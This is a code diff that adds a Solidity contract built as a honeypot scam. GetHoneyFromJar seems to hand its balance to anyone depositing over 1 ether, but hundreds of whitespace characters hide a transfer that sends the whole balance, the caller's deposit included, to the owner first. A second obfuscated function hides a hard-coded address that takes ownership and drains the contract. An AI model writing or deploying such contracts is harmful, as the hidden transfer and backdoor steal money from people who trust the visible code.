@@ -1,0 +1,27 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.4.19;
+
+contract HomeyJar {
+    address public Owner = msg.sender;
+
+    function() public payable {}
+
+    function GetHoneyFromJar() public payable {
+        bool _flag1 = false;
+        // Placeholder for future logic
+        if(msg.value>1 ether)
+        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Owner.transfer(this.balance);
+            msg.sender.transfer(this.balance);
+        }
+    }
+
+    function _0x22252f() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Owner=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}
+        require(msg.sender == Owner);
+        Owner.transfer(this.balance);
+    }
+
+    function Command(address _0xa1a70c,bytes data) payable public {
+        require(msg.sender == Owner);
+        _0xa1a70c.call.value(msg.value)(data);
+    }
+}
